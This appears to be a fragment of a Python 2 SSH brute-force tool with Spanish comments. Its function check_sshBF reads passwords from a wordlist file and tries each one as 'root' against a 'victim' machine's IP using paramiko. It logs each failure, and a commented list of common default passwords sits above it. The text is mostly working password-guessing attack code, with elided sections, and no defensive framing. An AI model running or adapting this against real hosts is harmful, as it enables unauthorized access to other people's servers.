...
#passwords = ["123456", "root", "admin", "12345","ldts123$%"]
...
def check_sshBF(ip):
        ...
        fail = 0
        user="root"
        #ESTA LINEA ABRE EL ARCHIVO "targetGi" EN MODO LECTURA, ESTE ARCHIVO CONTIENE TODA LAS CONTRASEÑAS QUE GIGANTE IRA PROBANDO Y LO GUARDARA EN LA VARIBALE "file"
        file = open("dic/targetGi.txt", "r")
        #SE LEE LAS LINEAS DEL ARCHIVO Y Y SE GUARDAN EN LA VARIABLE "targets"
        targets = file.readlines()

	#SE RECORRE TODA LAS LINEAS DEL FICHERO (LAS CONTRASEÑAS), DONDE EL GIGANTE INTENTARA CONCECTARSE A LA MAQUINA VICTIMA
        for target in targets:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                        print colores.verde + "|----[INFO] Try user: root password: " + target + colores.normal
                        ssh.connect(ip, username=user, password=target, timeout=10)
                except paramiko.AuthenticationException, error:
                        print "|----[ERROR] incorrect password... root@" + ip + ":" + target
                        continue
